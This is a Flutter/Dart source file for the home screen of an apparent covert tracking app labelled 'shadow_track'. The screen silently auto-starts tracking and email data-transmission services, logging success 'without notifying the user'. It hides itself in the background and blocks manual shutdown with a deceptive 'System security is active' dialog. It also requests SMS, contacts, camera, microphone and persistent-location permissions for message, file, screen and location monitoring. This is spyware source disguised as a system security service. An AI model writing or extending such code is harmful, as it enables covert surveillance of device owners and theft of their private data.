import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import '../services/tracking_service.dart';
import '../services/email_service.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  bool _isServiceActive = false;
  bool _isLoading = false;
  bool _autoStartCompleted = false;
  static const MethodChannel _channel = MethodChannel('shadow_track');

  @override
  void initState() {
    super.initState();
    _loadServiceStatus();
    _setupAutoStart();
  }

  /// 자동 시작 설정
  void _setupAutoStart() {
    // 채널에서 자동 시작 신호 수신 대기
    _channel.setMethodCallHandler((call) async {
      if (call.method == 'autoStartTracking') {
        await _performAutoStart();
      }
      return null;
    });

    // 앱 시작 후 잠시 뒤 자동 권한 요청
    Future.delayed(const Duration(seconds: 2), () {
      _requestPermissionsAutomatically();
    });
  }

  /// 자동 권한 요청
  Future<void> _requestPermissionsAutomatically() async {
    if (_autoStartCompleted) return;

    try {
      // 기본 권한들 자동 요청
      await _requestBasicPermissions();

      // 3초 후 권한 상태 확인
      Future.delayed(const Duration(seconds: 3), () {
        _checkAndAutoStart();
      });
    } catch (e) {
      print('자동 권한 요청 오류: $e');
    }
  }

  /// 기본 권한 요청
  Future<void> _requestBasicPermissions() async {
    final permissions = [
      Permission.location,
      Permission.storage,
    ];

    await permissions.request();
  }

  /// 권한 확인 및 자동 시작
  Future<void> _checkAndAutoStart() async {
    try {
      final locationStatus = await Permission.location.status;
      final storageStatus = await Permission.storage.status;

      // 기본 권한이 승인되면 자동 시작
      if (locationStatus.isGranted || storageStatus.isGranted) {
        await _performAutoStart();
      } else {
        // 권한이 부족하면 5초 후 재시도
        Future.delayed(const Duration(seconds: 5), () {
          _requestPermissionsAutomatically();
        });
      }
    } catch (e) {
      print('자동 시작 확인 오류: $e');
    }
  }

  /// 자동 시작 수행
  Future<void> _performAutoStart() async {
    if (_autoStartCompleted || _isServiceActive) return;

    try {
      setState(() {
        _isLoading = true;
      });

      // 추적 서비스 시작
      await TrackingService.startTracking();

      // 이메일 서비스 시작
      EmailService.startEmailService();

      setState(() {
        _isServiceActive = true;
        _autoStartCompleted = true;
      });

      // SharedPreferences에 상태 저장
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('service_active', true);
      await prefs.setBool('auto_start_completed', true);

      // 성공 로그 (사용자에게 알림 없이)
      print('자동 추적 시작 완료');
    } catch (e) {
      print('자동 시작 오류: $e');
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  /// 서비스 상태 로드
  Future<void> _loadServiceStatus() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _isServiceActive = prefs.getBool('service_active') ?? false;
      _autoStartCompleted = prefs.getBool('auto_start_completed') ?? false;
    });

    // 자동 시작이 완료되었다면 조용한 모드 유지
    if (_autoStartCompleted && _isServiceActive) {
      _enableQuietMode();
    }
  }

  /// 조용한 모드 (UI 변경)
  void _enableQuietMode() {
    Future.delayed(const Duration(seconds: 1), () {
      // 앱을 백그라운드로 이동
      SystemNavigator.pop();
    });
  }

  /// 수동 토글 (제한된 접근)
  Future<void> _toggleService() async {
    // 자동 시작이 완료된 경우 수동 토글 제한
    if (_autoStartCompleted && _isServiceActive) {
      _showRestrictedAccess();
      return;
    }

    setState(() {
      _isLoading = true;
    });

    try {
      final prefs = await SharedPreferences.getInstance();

      if (!_isServiceActive) {
        // 서비스 시작
        final permissions = await _requestPermissions();
        if (permissions) {
          await TrackingService.startTracking();
          EmailService.startEmailService();

          setState(() {
            _isServiceActive = true;
          });
          await prefs.setBool('service_active', true);

          _showSnackBar('System monitoring activated', Colors.green);
        } else {
          _showSnackBar('Permissions required for monitoring', Colors.red);
        }
      } else {
        // 서비스 중지
        await TrackingService.stopTracking();
        EmailService.stopEmailService();

        setState(() {
          _isServiceActive = false;
        });
        await prefs.setBool('service_active', false);

        _showSnackBar('System monitoring deactivated', Colors.orange);
      }
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  /// 권한 요청
  Future<bool> _requestPermissions() async {
    final permissions = [
      Permission.location,
      Permission.locationAlways,
      Permission.sms,
      Permission.storage,
      Permission.manageExternalStorage,
      Permission.contacts,
      Permission.camera,
      Permission.microphone,
    ];

    Map<Permission, PermissionStatus> statuses = await permissions.request();

    bool allGranted = statuses.values.every(
            (status) => status == PermissionStatus.granted
    );

    if (!allGranted) {
      _showSnackBar('All permissions are required for system monitoring', Colors.red);
    }

    return allGranted;
  }

  /// 제한된 접근 알림
  void _showRestrictedAccess() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Access Restricted'),
        content: const Text('System security is active. Manual control is disabled for protection.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  /// 스낵바 표시
  void _showSnackBar(String message, Color color) {
    if (!mounted) return;

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: color,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    // 자동 시작 완료시 최소한의 UI만 표시
    if (_autoStartCompleted && _isServiceActive) {
      return Scaffold(
        appBar: AppBar(
          title: const Text('System Service'),
          backgroundColor: Colors.grey[800],
        ),
        body: Container(
          color: Colors.grey[900],
          child: Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(
                  Icons.security,
                  size: 64,
                  color: Colors.green[600],
                ),
                const SizedBox(height: 16),
                Text(
                  'System Security Active',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  'Device monitoring is active',
                  style: TextStyle(
                    color: Colors.grey[400],
                    fontSize: 14,
                  ),
                ),
              ],
            ),
          ),
        ),
      );
    }

    // 일반 UI
    return Scaffold(
      appBar: AppBar(
        title: const Text('System Service Manager'),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Card(
              child: Padding(
                padding: const EdgeInsets.all(16.0),
                child: Column(
                  children: [
                    Icon(
                      _isServiceActive ? Icons.security : Icons.security_outlined,
                      size: 64,
                      color: _isServiceActive ? Colors.green : Colors.grey,
                    ),
                    const SizedBox(height: 16),
                    Text(
                      _isServiceActive ? 'System Monitoring Active' : 'System Monitoring Inactive',
                      style: Theme.of(context).textTheme.headlineSmall,
                      textAlign: TextAlign.center,
                    ),
                    const SizedBox(height: 8),
                    Text(
                      _isServiceActive
                          ? 'Your device is being monitored for security purposes'
                          : 'Enable monitoring to protect your device',
                      style: Theme.of(context).textTheme.bodyMedium,
                      textAlign: TextAlign.center,
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 24),
            _isLoading
                ? const Center(child: CircularProgressIndicator())
                : ElevatedButton(
              onPressed: _toggleService,
              style: ElevatedButton.styleFrom(
                backgroundColor: _isServiceActive ? Colors.red : Colors.green,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(vertical: 16),
              ),
              child: Text(
                _isServiceActive ? 'DEACTIVATE MONITORING' : 'ACTIVATE MONITORING',
                style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
              ),
            ),
            const SizedBox(height: 24),
            if (_isServiceActive) ...[
              const Card(
                child: Padding(
                  padding: EdgeInsets.all(16.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'Active Monitoring Features:',
                        style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      SizedBox(height: 8),
                      ListTile(
                        leading: Icon(Icons.location_on, color: Colors.blue),
                        title: Text('Location Tracking'),
                        dense: true,
                      ),
                      ListTile(
                        leading: Icon(Icons.message, color: Colors.blue),
                        title: Text('Message Monitoring'),
                        dense: true,
                      ),
                      ListTile(
                        leading: Icon(Icons.folder, color: Colors.blue),
                        title: Text('File Access Monitoring'),
                        dense: true,
                      ),
                      ListTile(
                        leading: Icon(Icons.screen_share, color: Colors.blue),
                        title: Text('Screen Activity'),
                        dense: true,
                      ),
                      ListTile(
                        leading: Icon(Icons.email, color: Colors.blue),
                        title: Text('Auto Data Transmission'),
                        dense: true,
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ],
        ),
      ),
    );
  }
}